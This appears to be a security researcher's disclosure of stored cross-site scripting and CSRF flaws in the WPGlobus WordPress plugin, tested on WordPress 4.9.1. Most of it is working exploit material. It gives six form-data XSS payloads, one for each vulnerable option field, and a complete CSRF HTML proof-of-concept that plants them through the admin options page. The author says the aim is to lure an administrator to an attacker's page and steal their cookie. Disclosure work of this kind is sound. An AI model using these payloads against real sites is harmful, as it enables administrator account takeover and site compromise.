Well ,sir ,I just found some Stored-XSS bugs and a CSRF bug at wp-plugin wpglobus.

#### Stored-XSS

When the admin user click the "Update Options" button in the wpglobus setting page, we'll post some data to:

```
http://localhost/wordpress/wp-admin/options.php
```


But when I pentest the  parameter in this plugin, I found when I write something into this point, it does not filter well.

Weak data parameter:
##### Stored XSS1
By the way, the parameter "wpglobus_option[enabled_languages][en]" can be "wpglobus_option[enabled_languages][fr]" or something similar.

```
------WebKitFormBoundaryGWoOgFDIacZK8gd1
Content-Disposition: form-data; name="wpglobus_option[enabled_languages][en]"

1'"><svg/onload=console.log(/xss1/)><'"

```

##### Stored XSS2

```
------WebKitFormBoundaryGWoOgFDIacZK8gd1
Content-Disposition: form-data; name="wpglobus_option[more_languages]"

'"><svg/onload=console.log(/xss2/)><'"

```

##### Stored XSS3

```
------WebKitFormBoundaryGWoOgFDIacZK8gd1
Content-Disposition: form-data; name="wpglobus_option[selector_wp_list_pages][show_selector]"

'"><svg/onload=console.log(/xss3/)><'"
```

##### Stored XSS4

```
------WebKitFormBoundaryGWoOgFDIacZK8gd1
Content-Disposition: form-data; name="wpglobus_option[post_type][post]"

1'"><svg/onload=console.log(/xss4/)><'"
```

##### Stored XSS5

```
------WebKitFormBoundaryGWoOgFDIacZK8gd1
Content-Disposition: form-data; name="wpglobus_option[post_type][page]"

1'"><svg/onload=console.log(/xss5/)><'"
```

##### Stored XSS6

```
------WebKitFormBoundaryGWoOgFDIacZK8gd1
Content-Disposition: form-data; name="wpglobus_option[browser_redirect][redirect_by_language]"

1'"><svg/onload=console.log(/xss6/)><'"
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/wpglobus/sxss.png)


#### CSRF

Well, the stored-xss here need to combined with a csrf bug. Because no csrf protection or wp_nonce here, we can cheat the admin user to visit the evil html on the evil site.

POC:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/wordpress/wp-admin/options.php" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="wpglobus&#95;option&#91;compiler&#93;" value="1" />
      <input type="hidden" name="wpglobus&#95;option&#91;redux&#45;section&#93;" value="1" />
      <input type="hidden" name="option&#95;page" value="wpglobus&#95;option&#95;group" />
      <input type="hidden" name="action" value="update" />
      <input type="hidden" name="&#95;wpnonce" value="8cf1859d8e" />
      <input type="hidden" name="&#95;wp&#95;http&#95;referer" value="&#47;wordpress&#47;wp&#45;admin&#47;admin&#46;php&#63;page&#61;wpglobus&#95;options" />
      <input type="hidden" name="wpglobus&#95;option&#91;last&#95;tab&#93;" value="" />
      <input type="hidden" name="wpglobus&#95;option&#91;enabled&#95;languages&#93;&#91;en&#93;" value="1&apos;&quot;&gt;&lt;svg&#47;onload&#61;console&#46;log&#40;&#47;xss1&#47;&#41;&gt;&lt;&apos;&quot;" />
      <input type="hidden" name="wpglobus&#95;option&#91;enabled&#95;languages&#93;&#91;es&#93;" value="1" />
      <input type="hidden" name="wpglobus&#95;option&#91;enabled&#95;languages&#93;&#91;de&#93;" value="1" />
      <input type="hidden" name="wpglobus&#95;option&#91;enabled&#95;languages&#93;&#91;fr&#93;" value="1" />
      <input type="hidden" name="wpglobus&#95;option&#91;enabled&#95;languages&#93;&#91;ru&#93;" value="1" />
      <input type="hidden" name="wpglobus&#95;option&#91;more&#95;languages&#93;" value="&apos;&quot;&gt;&lt;svg&#47;onload&#61;console&#46;log&#40;&#47;xss2&#47;&#41;&gt;&lt;&apos;&quot;" />
      <input type="hidden" name="wpglobus&#95;option&#91;show&#95;flag&#95;name&#93;" value="code" />
      <input type="hidden" name="wpglobus&#95;option&#91;use&#95;nav&#95;menu&#93;" value="" />
      <input type="hidden" name="wpglobus&#95;option&#91;selector&#95;wp&#95;list&#95;pages&#93;&#91;show&#95;selector&#93;" value="&apos;&quot;&gt;&lt;svg&#47;onload&#61;console&#46;log&#40;&#47;xss3&#47;&#41;&gt;&lt;&apos;&quot;" />
      <input type="hidden" name="wpglobus&#95;option&#91;css&#95;editor&#93;" value="" />
      <input type="hidden" name="wpglobus&#95;option&#91;js&#95;editor&#93;" value="" />
      <input type="hidden" name="paged" value="" />
      <input type="hidden" name="wpglobus&#95;option&#91;post&#95;type&#93;&#91;post&#93;" value="1&apos;&quot;&gt;&lt;svg&#47;onload&#61;console&#46;log&#40;&#47;xss4&#47;&#41;&gt;&lt;&apos;&quot;" />
      <input type="hidden" name="wpglobus&#95;option&#91;post&#95;type&#93;&#91;page&#93;" value="1&apos;&quot;&gt;&lt;svg&#47;onload&#61;console&#46;log&#40;&#47;xss5&#47;&#41;&gt;&lt;&apos;&quot;" />
      <input type="hidden" name="wpglobus&#95;option&#91;browser&#95;redirect&#93;&#91;redirect&#95;by&#95;language&#93;" value="1&apos;&quot;&gt;&lt;svg&#47;onload&#61;console&#46;log&#40;&#47;xss6&#47;&#41;&gt;&lt;&apos;&quot;" />
      <input type="hidden" name="redux&#95;save" value="�&#191;&#157;�&#173;&#152;�&#155;&#180;�&#148;&#185;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

In a word, if the manager could be cheated to visit my evil html on my site, I can get the manager's cookie easily, or do something more evilly.


Well,  by the way, I just test the bug in the wordpress 4.9.1 and the latest version of the wp-plugin wpglobus.